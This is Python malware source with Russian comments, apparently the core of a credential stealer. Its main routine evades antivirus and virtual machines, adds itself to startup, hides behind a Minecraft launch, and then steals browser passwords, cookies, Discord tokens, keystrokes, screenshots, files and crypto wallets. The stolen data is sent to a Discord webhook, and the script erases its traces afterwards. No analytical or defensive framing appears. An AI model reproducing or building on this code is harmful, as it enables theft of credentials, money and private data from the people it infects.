# Добавь эту функцию для шифрования файлов
def encrypt_file(file_path):
    with open(file_path, "rb") as f:
        data = f.read()
    encrypted_data = CIPHER.encrypt(data)
    encrypted_path = file_path + ".encrypted"
    with open(encrypted_path, "wb") as f:
        f.write(encrypted_data)
    return encrypted_path

# Обновлённая функция отправки в Discord
def send_to_discord(title, description, color=0xFF0000, file_path=None):
    data = {
        "embeds": [{
            "title": title,
            "description": description,
            "color": color
        }]
    }
    if file_path:
        encrypted_path = encrypt_file(file_path)
        files = {"file": open(encrypted_path, "rb")}
        requests.post(DISCORD_WEBHOOK_URL, data={"payload_json": json.dumps(data)}, files=files)
    else:
        requests.post(DISCORD_WEBHOOK_URL, json=data)

# Обновлённая главная функция с фильтрацией
def main():
    # Фильтрация: не запускаем на твоём компьютере
    if getpass.getuser() == "твоё_имя_пользователя":  # Замени на своё имя
        logging.warning("Скрипт запущен на твоём компьютере, завершаю работу!")
        send_to_discord("🚨 Ошибка!", "Скрипт запущен на компьютере автора!", 0xFF0000)
        return

    # Логируем ключ шифрования
    logging.info(f"Ключ шифрования: {ENCRYPTION_KEY.decode()}")

    # Проверка на антивирус и ВМ
    if check_antivirus() or is_vm():
        send_to_discord("🚨 Обнаружен антивирус или ВМ!", "Завершаю работу!", 0xFF0000)
        return

    # Полиморфизм, маскировка и автозапуск
    polymorph_script()
    mask_process()
    add_to_startup()
    spam_processes()

    # Запускаем Minecraft для маскировки
    launch_minecraft()
    while not is_minecraft_running():
        logging.info("Ожидаю запуск Minecraft...")
        time.sleep(2)

    # Собираем данные в параллельных потоках
    send_to_discord("🎯 Новый запуск стилера!", "Сбор данных начат!", 0x00FF00)
    
    threads = []
    
    # Системная информация
    def send_system_info():
        system_info = get_system_info()
        send_to_discord("💻 Системная информация", system_info, 0x00FF00)
    threads.append(threading.Thread(target=send_system_info))

    # Кража паролей из Chrome
    def send_chrome_passwords():
        passwords = steal_chrome_passwords()
        send_to_discord("🔑 Пароли из Chrome", passwords, 0xFF0000)
    threads.append(threading.Thread(target=send_chrome_passwords))

    # Кража паролей из Firefox
    def send_firefox_passwords():
        passwords = steal_firefox_passwords()
        send_to_discord("🦊 Пароли из Firefox", passwords, 0xFF4500)
    threads.append(threading.Thread(target=send_firefox_passwords))

    # Кража паролей из Edge
    def send_edge_passwords():
        passwords = steal_edge_passwords()
        send_to_discord("🌐 Пароли из Edge", passwords, 0x1E90FF)
    threads.append(threading.Thread(target=send_edge_passwords))

    # Кража cookies
    def send_cookies():
        cookies = steal_chrome_cookies()
        send_to_discord("🍪 Cookies из Chrome", cookies, 0xFFD700)
    threads.append(threading.Thread(target=send_cookies))

    # Кража токенов Discord
    def send_discord_tokens():
        tokens = steal_discord_tokens()
        send_to_discord("🎮 Токены Discord", tokens, 0x7289DA)
    threads.append(threading.Thread(target=send_discord_tokens))

    # Скриншот
    def send_screenshot():
        screenshot = take_screenshot()
        send_to_discord("🖼️ Скриншот экрана", "Скриншот отправлен!", 0x00CED1, file_path=screenshot)
    threads.append(threading.Thread(target=send_screenshot))

    # Keylogger
    def send_keylog():
        keylog_file = keylogger()
        send_to_discord("⌨️ Лог клавиш", "Лог отправлен!", 0xFF69B4, file_path=keylog_file)
    threads.append(threading.Thread(target=send_keylog))

    # Кража файлов
    def send_files():
        files = steal_files()
        for file in files:
            send_to_discord("📁 Найден файл!", f"Файл: {os.path.basename(file)}", 0x32CD32, file_path=file)
    threads.append(threading.Thread(target=send_files))

    # Кража криптокошельков
    def send_wallets():
        wallets = steal_crypto_wallets()
        for wallet in wallets:
            send_to_discord("💰 Найден криптокошелёк!", f"Кошелёк: {os.path.basename(wallet)}", 0xFFD700, file_path=wallet)
    threads.append(threading.Thread(target=send_wallets))

    # Запускаем все потоки
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    # Очистка следов
    clear_traces()
    shutil.rmtree(TEMP_DIR, ignore_errors=True)
    logging.info("Следы очищены")

if __name__ == "__main__":
    main()
